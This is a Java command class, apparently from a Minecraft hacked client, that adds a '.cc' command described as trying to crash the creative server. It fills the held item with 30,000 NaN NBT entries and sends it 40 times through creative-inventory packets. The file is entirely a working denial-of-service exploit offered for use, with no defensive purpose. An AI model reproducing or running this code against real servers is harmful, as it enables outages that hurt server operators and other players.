package me.aidanmees.trivia.client.commands;

import java.util.Random;

import me.aidanmees.trivia.client.main.trivia;
import net.minecraft.client.Minecraft;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CommandCReativeCrasher2 extends Command {

	
	
	
	@Override
	public void run(String[] args) {
		 
		
		    if (!mc.thePlayer.capabilities.isCreativeMode)
		    {
		      trivia.chatMessage("You must be in creative.");
		      return;
		    }
		    ItemStack stack = mc.thePlayer.getCurrentEquippedItem();
		    String crashText = "";
            NBTTagCompound base = new NBTTagCompound();
            int i2 = 0;
            while (i2 < 30000) {
                base.setDouble(String.valueOf(i2), Double.NaN);
                ++i2;
            }
            stack.setTagCompound(base);
            i2 = 0;
            while (i2 < 40) {
                Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(i2, stack));
                ++i2;
            }
		
}
	public int getRandom(int min, int max)
	  {
	    Random rand = new Random();
	    return min + rand.nextInt(max - min + 1);
	  }
	  
	  


	@Override
	public String getActivator() {
		return ".cc";
	}

	@Override
	public String getSyntax() {
		return ".cc";
	}

	@Override
	public String getDesc() {
		return "Tries to crash the creative server! (2)";
	}
}
